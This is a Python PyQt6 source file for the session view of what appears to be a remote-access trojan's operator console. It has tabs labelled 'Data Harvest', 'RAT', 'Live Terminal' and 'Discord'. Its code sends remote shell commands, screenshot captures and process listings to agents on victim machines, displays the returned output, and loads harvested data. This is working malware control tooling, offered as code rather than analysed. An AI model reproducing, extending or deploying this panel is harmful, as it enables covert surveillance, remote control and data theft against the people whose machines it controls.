# ui/session_view.py (Full Code)
import uuid
from datetime import datetime
import base64
from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLabel, 
                             QTabWidget, QTextEdit, QDialog, QScrollArea)
from PyQt6.QtCore import pyqtSignal, Qt
from PyQt6.QtGui import QPixmap
from .discord_pane import DiscordPane
from .terminal_pane import TerminalPane
from .live_actions_pane import LiveActionsPane
from .events_pane import EventsPane
from .data_harvest_pane import DataHarvestPane

class ScreenshotDialog(QDialog):
    def __init__(self, pixmap, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Screenshot Viewer")
        layout = QVBoxLayout(self)
        self.image_label = QLabel()
        self.image_label.setPixmap(pixmap)
        scroll_area = QScrollArea()
        scroll_area.setWidget(self.image_label)
        scroll_area.setWidgetResizable(True)
        layout.addWidget(scroll_area)
        self.resize(800, 600)

class SessionView(QWidget):
    back_requested = pyqtSignal()
    task_requested = pyqtSignal(str, dict)

    def __init__(self, db_manager):
        super().__init__()
        self.db = db_manager
        self.current_session_id = None
        self.response_map = {}
        
        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(10, 10, 10, 10)
        main_layout.setSpacing(10)

        header_widget = QWidget()
        header_layout = QHBoxLayout(header_widget)
        header_layout.setContentsMargins(0, 0, 0, 0)
        
        self.back_button = QPushButton("< Back")
        self.back_button.setFixedWidth(100)
        self.back_button.clicked.connect(self.back_requested.emit)
        
        self.session_info_label = QLabel("Managing Session: None")
        self.session_info_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        self.status_label = QLabel("UNKNOWN")
        self.status_label.setObjectName("HeaderStatusLabel")
        self.status_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.status_label.setFixedWidth(120)

        header_layout.addWidget(self.back_button)
        header_layout.addWidget(self.session_info_label)
        header_layout.addWidget(self.status_label)
        main_layout.addWidget(header_widget)

        self.tabs = QTabWidget()
        main_layout.addWidget(self.tabs)

        self.data_harvest_pane = DataHarvestPane()
        self.rat_pane = QLabel("Remote Administration Tools (Coming Soon)")
        self.rat_pane.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.liveactions_pane = LiveActionsPane()
        self.liveactions_pane.screenshot_requested.connect(self.send_screenshot_task)
        self.liveactions_pane.pslist_requested.connect(self.send_pslist_task)
        self.terminal_pane = TerminalPane()
        self.terminal_pane.command_entered.connect(self.send_terminal_command)
        self.drive_manager_pane = QLabel("Drive Manager (Coming Soon)")
        self.drive_manager_pane.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.events_pane = EventsPane()
        self.discord_pane = DiscordPane()

        self.tabs.addTab(self.data_harvest_pane, "Data Harvest")
        self.tabs.addTab(self.rat_pane, "RAT")
        self.tabs.addTab(self.liveactions_pane, "Live Actions")
        self.tabs.addTab(self.terminal_pane, "Live Terminal")
        self.tabs.addTab(self.drive_manager_pane, "Drive Manager")
        self.tabs.addTab(self.events_pane, "Events")
        self.tabs.addTab(self.discord_pane, "Discord")
    
    def load_session(self, session_id, session_data):
        self.current_session_id = session_id
        metadata = session_data.get('metadata', {})
        status = session_data.get('status', 'Offline')

        self.terminal_pane.clear_output()
        self.liveactions_pane.clear_results()
        self.events_pane.clear_events()
        
        historical_results = self.db.load_results_for_session(session_id)
        self.data_harvest_pane.load_data(historical_results)
        for result in historical_results:
            self.route_historical_data(result)

        user = metadata.get('user', 'N/A')
        hostname = metadata.get('hostname', 'N/A')
        ip = metadata.get('ip', 'N/A')
        self.session_info_label.setText(f"<b>{user}@{hostname}</b> ({ip})")
        
        self.status_label.setText(status.upper())
        self.status_label.setProperty("status", status.lower())
        self.status_label.style().unpolish(self.status_label)
        self.status_label.style().polish(self.status_label)
        
        self.tabs.setCurrentIndex(0)

    def route_historical_data(self, result):
        command = result['command_name']
        data = result['data']
        timestamp = result['timestamp']

        if command == "pslist":
            self.liveactions_pane.display_result(f"--- (Saved) Process List @ {timestamp} ---\n{data}\n")
        elif command == "Agent Event":
            self.events_pane.add_event(data)
        elif command == "screenshot":
            self.events_pane.add_event(f"[{timestamp}] Screenshot was taken (data stored in DB).")

    def send_terminal_command(self, command):
        task = {"action": "shell", "params": {"command": command}}
        self._send_task(task)

    def send_screenshot_task(self):
        self._send_task({"action": "screenshot", "params": {}})

    def send_pslist_task(self):
        self._send_task({"action": "pslist", "params": {}})

    def _send_task(self, task_data):
        if self.current_session_id:
            response_id = str(uuid.uuid4())
            task_data["response_id"] = response_id
            self.response_map[response_id] = task_data
            self.task_requested.emit(self.current_session_id, task_data)

    def handle_command_response(self, session_id, response_data):
        if session_id != self.current_session_id:
            return
            
        response_id = response_data.get('response_id')
        original_task = self.response_map.pop(response_id, {})
        action = original_task.get('action', 'unknown')
        
        result = response_data.get('result', {})
        status = result.get('status')
        data = result.get('data', '[No data received]')
        
        if status == 'error':
            self.events_pane.add_event(f"[{datetime.now():%H:%M:%S}] [ERROR] Action '{action}' failed: {data}")
            return
        
        if action == "shell":
            command = original_task.get("params", {}).get("command", "")
            self.terminal_pane.append_output(f"> {command}\n{data}\n")
        elif action == "pslist":
            self.liveactions_pane.display_result(f"--- Process List @ {datetime.now():%Y-%m-%d %H:%M:%S} ---\n{data}\n")
        elif action == "screenshot":
            try:
                img_data = base64.b64decode(data)
                pixmap = QPixmap()
                pixmap.loadFromData(img_data)
                dialog = ScreenshotDialog(pixmap, self)
                dialog.exec()
            except Exception as e:
                self.events_pane.add_event(f"[{datetime.now():%H:%M:%S}] [ERROR] Could not display screenshot: {e}")
        elif action == "harvest_all":
            historical_results = self.db.load_results_for_session(session_id)
            self.data_harvest_pane.load_data(historical_results)
    
    def handle_agent_event(self, session_id, result_data):
        if session_id == self.current_session_id:
            data = result_data.get('data', '[No data]')
            self.events_pane.add_event(data)